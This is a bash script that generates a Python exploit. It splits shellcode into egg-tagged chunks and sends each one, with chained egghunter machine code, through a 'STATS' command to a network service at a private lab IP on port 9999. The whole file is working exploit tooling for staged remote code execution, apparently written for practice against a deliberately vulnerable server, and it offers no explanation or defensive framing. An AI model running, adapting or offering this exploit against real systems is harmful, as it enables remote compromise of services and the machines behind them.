#!/bin/bash

FILE=./shell-raw
CAVE_SIZE=96
EGG_BASE="00W"
EGG_SEQ=" ABCDEFGHIJKLMNOPQRSTUVWXYZ"

echo "#!/usr/bin/env python"
echo "import socket"
echo "import time"

C_COUNT=1
CAVE=""
for L in $(./encode.py "$(cat ${FILE})")
do
    NEW_C="${CAVE}${L}"
    if [ ${#NEW_C} -gt ${CAVE_SIZE} ]
    then
        EGG=$(echo -n "${EGG_SEQ:${C_COUNT}:1}${EGG_BASE}" | xxd -p)
        cat << EOF 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.186.135", 9999))

message  = "STATS "
message += "/.:/ "

# Cave ${C_COUNT} (${EGG}):
$(echo -n "${EGG}${EGG}${CAVE}" | hex)

buf += "\x31\xd2\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58"
buf += "\xcd\x2e\x3c\x05\x5a\x74\xef\xb8${EGG_SEQ:$((C_COUNT + 1)):1}\x30\x30\x57" 
buf += "\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

message += buf
message += '\n'
s.send(message)
s.close()
time.sleep(0.5)
EOF
        CAVE="${L}"
        C_COUNT=$((C_COUNT + 1))
    else
        CAVE=${NEW_C}
    fi
done

EGG=$(echo -n "${EGG_SEQ:${C_COUNT}:1}${EGG_BASE}" | xxd -p)
cat << EOF 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.186.135", 9999))

message  = "STATS "
message += "/.:/ "

# Cave ${C_COUNT} (${EGG}):
$(echo -n "${EGG}${EGG}${CAVE}" | hex)

message += buf
message += "\x68\x47\x47\x47\x47"
message += "\x68\x47\x47\x47\x47"
message += "\x68\x47\x47\x47\x47"
message += "\x68\x47\x47\x47\x47"
message += "\xff\xe4"
message += '\n'
s.send(message)
s.close()
EOF
